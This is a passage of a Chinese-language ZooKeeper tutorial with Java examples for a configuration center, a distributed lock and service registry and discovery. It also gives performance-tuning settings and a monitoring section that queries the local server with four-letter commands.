                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> SyncConnected:
                    System.out.println(<span class="hljs-string">"成功连接到ZooKeeper"</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> Disconnected:
                    System.out.println(<span class="hljs-string">"与ZooKeeper断开连接"</span>);
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<p><strong>配置中心使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigCenterExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建配置中心</span>
        <span class="hljs-type">DistributedConfigCenter</span> <span class="hljs-variable">configCenter</span> <span class="hljs-operator">=</span> 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedConfigCenter</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-string">"/app/config"</span>);
        
        <span class="hljs-comment">// 添加配置监听器</span>
        configCenter.addConfigListener(newConfig -&gt; {
            System.out.println(<span class="hljs-string">"配置发生变化: "</span> + newConfig);
        });
        
        <span class="hljs-comment">// 设置配置</span>
        configCenter.setConfig(<span class="hljs-string">"database.url"</span>, <span class="hljs-string">"jdbc:mysql://localhost:3306/app"</span>);
        configCenter.setConfig(<span class="hljs-string">"cache.enabled"</span>, <span class="hljs-string">"true"</span>);
        configCenter.setConfig(<span class="hljs-string">"thread.pool.size"</span>, <span class="hljs-string">"10"</span>);
        
        <span class="hljs-comment">// 获取配置</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">dbUrl</span> <span class="hljs-operator">=</span> configCenter.getConfig(<span class="hljs-string">"database.url"</span>);
        System.out.println(<span class="hljs-string">"数据库URL: "</span> + dbUrl);
        
        <span class="hljs-comment">// 模拟配置更新</span>
        Thread.sleep(<span class="hljs-number">30000</span>);
        configCenter.setConfig(<span class="hljs-string">"thread.pool.size"</span>, <span class="hljs-string">"20"</span>);
    }
}
</code></pre>
<h3 data-id="heading-35">4.2 高可用分布式锁实现</h3>
<p>分布式锁是分布式系统中协调资源访问的关键组件。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String lockPath;
    <span class="hljs-keyword">private</span> String currentLockPath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">lockAcquiredLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasLock</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedLock</span><span class="hljs-params">(ZooKeeper zk, String lockPath)</span> {
        <span class="hljs-built_in">this</span>.zk = zk;
        <span class="hljs-built_in">this</span>.lockPath = lockPath;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保锁目录存在</span>
        ensureLockPathExists();
        
        <span class="hljs-comment">// 创建临时有序节点</span>
        currentLockPath = zk.create(lockPath + <span class="hljs-string">"/lock-"</span>, 
                                   Thread.currentThread().getName().getBytes(),
                                   ZooDefs.Ids.OPEN_ACL_UNSAFE,
                                   CreateMode.EPHEMERAL_SEQUENTIAL);
        
        System.out.println(<span class="hljs-string">"创建锁节点: "</span> + currentLockPath);
        
        <span class="hljs-comment">// 尝试获取锁</span>
        <span class="hljs-keyword">return</span> attemptLockAcquisition(timeout, unit);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureLockPathExists</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(lockPath, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.create(lockPath, 
                         <span class="hljs-literal">null</span>,
                         ZooDefs.Ids.OPEN_ACL_UNSAFE,
                         CreateMode.PERSISTENT);
            } <span class="hljs-keyword">catch</span> (KeeperException.NodeExistsException e) {
                <span class="hljs-comment">// 节点已存在，忽略</span>
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">attemptLockAcquisition</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 获取所有锁节点</span>
        List&lt;String&gt; lockNodes = zk.getChildren(lockPath, <span class="hljs-literal">false</span>);
        Collections.sort(lockNodes); <span class="hljs-comment">// 按序列号排序</span>
        
        <span class="hljs-type">String</span> <span class="hljs-variable">currentLockName</span> <span class="hljs-operator">=</span> currentLockPath.substring(lockPath.length() + <span class="hljs-number">1</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">currentIndex</span> <span class="hljs-operator">=</span> lockNodes.indexOf(currentLockName);
        
        <span class="hljs-keyword">if</span> (currentIndex &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 当前节点不存在，可能已被删除</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"锁节点不存在: "</span> + currentLockName);
        }
        
        <span class="hljs-keyword">if</span> (currentIndex == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 当前节点是最小序号，获得锁</span>
            hasLock = <span class="hljs-literal">true</span>;
            System.out.println(<span class="hljs-string">"成功获得锁: "</span> + currentLockPath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 监听前一个节点</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">previousLockPath</span> <span class="hljs-operator">=</span> lockPath + <span class="hljs-string">"/"</span> + lockNodes.get(currentIndex - <span class="hljs-number">1</span>);
            System.out.println(<span class="hljs-string">"等待前一个锁释放: "</span> + previousLockPath);
            
            <span class="hljs-comment">// 设置监听器</span>
            <span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> zk.exists(previousLockPath, event -&gt; {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeDeleted) {
                    lockAcquiredLatch.countDown();
                }
            });
            
            <span class="hljs-keyword">if</span> (stat == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 前一个节点已不存在，重试</span>
                <span class="hljs-keyword">return</span> attemptLockAcquisition(timeout, unit);
            }
            
            <span class="hljs-comment">// 等待锁释放或超时</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">acquired</span> <span class="hljs-operator">=</span> lockAcquiredLatch.await(timeout, unit);
            <span class="hljs-keyword">if</span> (acquired) {
                hasLock = <span class="hljs-literal">true</span>;
                System.out.println(<span class="hljs-string">"成功获得锁: "</span> + currentLockPath);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"获取锁超时: "</span> + currentLockPath);
                <span class="hljs-comment">// 清理当前节点</span>
                cleanup();
            }
            <span class="hljs-keyword">return</span> acquired;
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (hasLock &amp;&amp; currentLockPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.delete(currentLockPath, -<span class="hljs-number">1</span>);
                System.out.println(<span class="hljs-string">"释放锁: "</span> + currentLockPath);
            } <span class="hljs-keyword">catch</span> (KeeperException.NoNodeException e) {
                <span class="hljs-comment">// 节点已不存在，忽略</span>
            } <span class="hljs-keyword">finally</span> {
                hasLock = <span class="hljs-literal">false</span>;
                currentLockPath = <span class="hljs-literal">null</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (currentLockPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.delete(currentLockPath, -<span class="hljs-number">1</span>);
            } <span class="hljs-keyword">catch</span> (KeeperException.NoNodeException e) {
                <span class="hljs-comment">// 节点已不存在，忽略</span>
            }
            currentLockPath = <span class="hljs-literal">null</span>;
        }
        hasLock = <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// 自动释放锁的实现</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (!tryLock(Long.MAX_VALUE, TimeUnit.MILLISECONDS)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"获取锁失败"</span>);
        }
    }
    
    <span class="hljs-comment">// 带回调的锁获取</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockWithCallback</span><span class="hljs-params">(Runnable criticalSection)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">try</span> {
            lock();
            criticalSection.run();
        } <span class="hljs-keyword">finally</span> {
            unlock();
        }
    }
}
</code></pre>
<p><strong>分布式锁使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">startLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">endLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(THREAD_COUNT);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">lockPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/app/locks/resource"</span>;
        
        <span class="hljs-comment">// 创建多个线程竞争锁</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; THREAD_COUNT; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> i;
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">DistributedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedLock</span>(zk, lockPath);
                    
                    <span class="hljs-comment">// 等待开始信号</span>
                    startLatch.await();
                    
                    System.out.println(<span class="hljs-string">"线程 "</span> + threadId + <span class="hljs-string">" 尝试获取锁"</span>);
                    
                    <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">10</span>, TimeUnit.SECONDS)) {
                        <span class="hljs-keyword">try</span> {
                            System.out.println(<span class="hljs-string">"&gt;&gt;&gt; 线程 "</span> + threadId + <span class="hljs-string">" 获得锁，执行关键代码"</span>);
                            Thread.sleep(<span class="hljs-number">2000</span>); <span class="hljs-comment">// 模拟业务处理</span>
                            System.out.println(<span class="hljs-string">"&gt;&gt;&gt; 线程 "</span> + threadId + <span class="hljs-string">" 释放锁"</span>);
                        } <span class="hljs-keyword">finally</span> {
                            lock.unlock();
                        }
                    } <span class="hljs-keyword">else</span> {
                        System.out.println(<span class="hljs-string">"线程 "</span> + threadId + <span class="hljs-string">" 获取锁超时"</span>);
                    }
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                } <span class="hljs-keyword">finally</span> {
                    endLatch.countDown();
                }
            }).start();
        }
        
        <span class="hljs-comment">// 同时启动所有线程</span>
        Thread.sleep(<span class="hljs-number">1000</span>);
        startLatch.countDown();
        
        <span class="hljs-comment">// 等待所有线程完成</span>
        endLatch.await();
        zk.close();
    }
}
</code></pre>
<h3 data-id="heading-36">4.3 服务注册与发现系统</h3>
<p>服务注册与发现是微服务架构中的核心组件。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceRegistry</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">REGISTRY_ROOT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> String currentServicePath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceAddress;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServiceRegistry</span><span class="hljs-params">(ZooKeeper zk, String serviceName, String serviceAddress)</span> {
        <span class="hljs-built_in">this</span>.zk = zk;
        <span class="hljs-built_in">this</span>.serviceName = serviceName;
        <span class="hljs-built_in">this</span>.serviceAddress = serviceAddress;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保注册中心根目录存在</span>
        ensureRegistryRootExists();
        
        <span class="hljs-comment">// 创建服务目录</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
        <span class="hljs-keyword">if</span> (zk.exists(servicePath, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            zk.create(servicePath, 
                     <span class="hljs-literal">null</span>,
                     ZooDefs.Ids.OPEN_ACL_UNSAFE,
                     CreateMode.PERSISTENT);
        }
        
        <span class="hljs-comment">// 注册服务实例（临时有序节点）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">instancePath</span> <span class="hljs-operator">=</span> servicePath + <span class="hljs-string">"/instance-"</span>;
        currentServicePath = zk.create(instancePath,
                                      serviceAddress.getBytes(),
                                      ZooDefs.Ids.OPEN_ACL_UNSAFE,
                                      CreateMode.EPHEMERAL_SEQUENTIAL);
        
        System.out.println(<span class="hljs-string">"服务注册成功: "</span> + currentServicePath + <span class="hljs-string">" -&gt; "</span> + serviceAddress);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unregister</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (currentServicePath != <span class="hljs-literal">null</span>) {
            zk.delete(currentServicePath, -<span class="hljs-number">1</span>);
            System.out.println(<span class="hljs-string">"服务注销: "</span> + currentServicePath);
            currentServicePath = <span class="hljs-literal">null</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureRegistryRootExists</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(REGISTRY_ROOT, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.create(REGISTRY_ROOT,
                         <span class="hljs-literal">null</span>,
                         ZooDefs.Ids.OPEN_ACL_UNSAFE,
                         CreateMode.PERSISTENT);
            } <span class="hljs-keyword">catch</span> (KeeperException.NodeExistsException e) {
                <span class="hljs-comment">// 节点已存在，忽略</span>
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceDiscovery</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; serviceInstances = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ServiceDiscoveryListener&gt; listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServiceDiscovery</span><span class="hljs-params">(ZooKeeper zk)</span> {
            <span class="hljs-built_in">this</span>.zk = zk;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watchService</span><span class="hljs-params">(String serviceName)</span> <span class="hljs-keyword">throws</span> Exception {
            <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
            
            <span class="hljs-comment">// 监听服务实例变化</span>
            <span class="hljs-type">ChildWatcher</span> <span class="hljs-variable">childWatcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChildWatcher</span>(serviceName);
            List&lt;String&gt; instances = zk.getChildren(servicePath, childWatcher);
            
            updateServiceInstances(serviceName, instances);
        }
        
        <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getServiceInstances</span><span class="hljs-params">(String serviceName)</span> {
            <span class="hljs-keyword">return</span> serviceInstances.getOrDefault(serviceName, Collections.emptyList());
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">(ServiceDiscoveryListener listener)</span> {
            listeners.add(listener);
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateServiceInstances</span><span class="hljs-params">(String serviceName, List&lt;String&gt; instances)</span> <span class="hljs-keyword">throws</span> Exception {
            List&lt;String&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (String instance : instances) {
                <span class="hljs-type">String</span> <span class="hljs-variable">instancePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName + <span class="hljs-string">"/"</span> + instance;
                <span class="hljs-type">byte</span>[] data = zk.getData(instancePath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
                addresses.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));
            }
            
            List&lt;String&gt; oldAddresses = serviceInstances.put(serviceName, addresses);
            
            <span class="hljs-comment">// 通知监听器</span>
            <span class="hljs-keyword">if</span> (!addresses.equals(oldAddresses)) {
                <span class="hljs-keyword">for</span> (ServiceDiscoveryListener listener : listeners) {
                    listener.onServiceChanged(serviceName, addresses);
                }
            }
            
            System.out.println(<span class="hljs-string">"服务 "</span> + serviceName + <span class="hljs-string">" 实例更新: "</span> + addresses);
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildWatcher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watcher</span> {
            <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceName;
            
            <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChildWatcher</span><span class="hljs-params">(String serviceName)</span> {
                <span class="hljs-built_in">this</span>.serviceName = serviceName;
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent event)</span> {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeChildrenChanged) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
                        List&lt;String&gt; newInstances = zk.getChildren(servicePath, <span class="hljs-built_in">this</span>);
                        updateServiceInstances(serviceName, newInstances);
                    } <span class="hljs-keyword">catch</span> (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ServiceDiscoveryListener</span> {
            <span class="hljs-keyword">void</span> <span class="hljs-title function_">onServiceChanged</span><span class="hljs-params">(String serviceName, List&lt;String&gt; instances)</span>;
        }
    }
}
</code></pre>
<p><strong>服务注册发现使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceRegistryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 服务提供者 - 注册服务</span>
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"user-service"</span>, <span class="hljs-string">"192.168.1.101:8080"</span>);
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"user-service"</span>, <span class="hljs-string">"192.168.1.102:8080"</span>);
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"order-service"</span>, <span class="hljs-string">"192.168.1.103:8080"</span>);
        
        provider1.register();
        provider2.register();
        provider3.register();
        
        <span class="hljs-comment">// 服务消费者 - 发现服务</span>
        ServiceRegistry.<span class="hljs-type">ServiceDiscovery</span> <span class="hljs-variable">discovery</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>.ServiceDiscovery(zk);
        
        discovery.addListener((serviceName, instances) -&gt; {
            System.out.println(<span class="hljs-string">"=== 服务变化通知 ==="</span>);
            System.out.println(<span class="hljs-string">"服务: "</span> + serviceName);
            System.out.println(<span class="hljs-string">"实例: "</span> + instances);
            System.out.println(<span class="hljs-string">"=================="</span>);
        });
        
        discovery.watchService(<span class="hljs-string">"user-service"</span>);
        discovery.watchService(<span class="hljs-string">"order-service"</span>);
        
        <span class="hljs-comment">// 模拟服务变化</span>
        Thread.sleep(<span class="hljs-number">30000</span>);
        
        <span class="hljs-comment">// 获取当前服务实例</span>
        List&lt;String&gt; userServices = discovery.getServiceInstances(<span class="hljs-string">"user-service"</span>);
        System.out.println(<span class="hljs-string">"当前用户服务实例: "</span> + userServices);
        
        <span class="hljs-comment">// 清理</span>
        provider1.unregister();
        provider2.unregister();
        provider3.unregister();
        zk.close();
    }
}
</code></pre>
<h2 data-id="heading-37">5. 性能优化与最佳实践</h2>
<h3 data-id="heading-38">5.1 性能优化策略</h3>
<h4 data-id="heading-39">5.1.1 会话管理优化</h4>
<pre><code class="hljs language-properties" lang="properties"># 会话超时优化
tickTime=2000
minSessionTimeout=4000    # 2 * tickTime
maxSessionTimeout=20000   # 10 * tickTime

# 连接管理
maxClientCnxns=100        # 单个IP最大连接数
globalOutstandingLimit=1000  # 全局待处理请求限制
</code></pre>
<h4 data-id="heading-40">5.1.2 数据存储优化</h4>
<pre><code class="hljs language-properties" lang="properties"># 数据目录分离
dataDir=/data/zookeeper/snapshot   # 快照目录
dataLogDir=/data/zookeeper/logs    # 事务日志目录（建议使用SSD）

# 存储优化
preAllocSize=65536        # 预分配文件大小
snapCount=100000          # 多少次事务后做快照
autopurge.snapRetainCount=5    # 保留的快照数量
autopurge.purgeInterval=6      # 清理间隔（小时）
</code></pre>
<h4 data-id="heading-41">5.1.3 JVM 优化</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># JVM 参数示例</span>
<span class="hljs-built_in">export</span> JVMFLAGS=<span class="hljs-string">"-Xmx4G -Xms4G -XX:+UseG1GC 
                 -XX:MaxGCPauseMillis=200 
                 -XX:ParallelGCThreads=8
                 -XX:ConcGCThreads=4
                 -Xloggc:/var/log/zookeeper/gc.log
                 -XX:+PrintGCDetails
                 -XX:+PrintGCDateStamps"</span>
</code></pre>
<h3 data-id="heading-42">5.2 监控与运维</h3>
<h4 data-id="heading-43">5.2.1 关键监控指标</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZooKeeperMonitor</span> {
    <span class="hljs-comment">// 关键性能指标监控</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorKeyMetrics</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 节点数量监控</span>
        monitorZnodeCount();
        
        <span class="hljs-comment">// 2. 会话状态监控</span>
        monitorSessionStats();
        
        <span class="hljs-comment">// 3. 请求吞吐量监控</span>
        monitorRequestThroughput();
        
        <span class="hljs-comment">// 4. 延迟监控</span>
        monitorRequestLatency();
        
        <span class="hljs-comment">// 5. 集群健康状态</span>
        monitorClusterHealth();
        
        <span class="hljs-comment">// 6. 磁盘使用监控</span>
        monitorDiskUsage();
        
        <span class="hljs-comment">// 7. 网络连接监控</span>
        monitorNetworkConnections();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorZnodeCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用四字命令获取统计信息</span>
            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">"echo mntr | nc localhost 2181"</span>);
            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));
            
            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (line.startsWith(<span class="hljs-string">"zk_znode_count"</span>)) {
                    System.out.println(<span class="hljs-string">"当前节点数量: "</span> + line.split(<span class="hljs-string">"\t"</span>)[<span class="hljs-number">1</span>]);
                }
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h4 data-id="heading-44">5.2.2 四字命令监控工具</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ZooKeeper 监控脚本</span>

ZK_HOST=<span class="hljs-string">"localhost"</span>
ZK_PORT=<span class="hljs-string">"2181"</span>

<span class="hljs-comment"># 检查服务器状态</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== ZooKeeper 服务器状态 ==="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-built_in">stat</span> | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== ZooKeeper 配置信息 ==="</span>  
<span class="hljs-built_in">echo</span> conf | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 客户端连接信息 ==="</span>
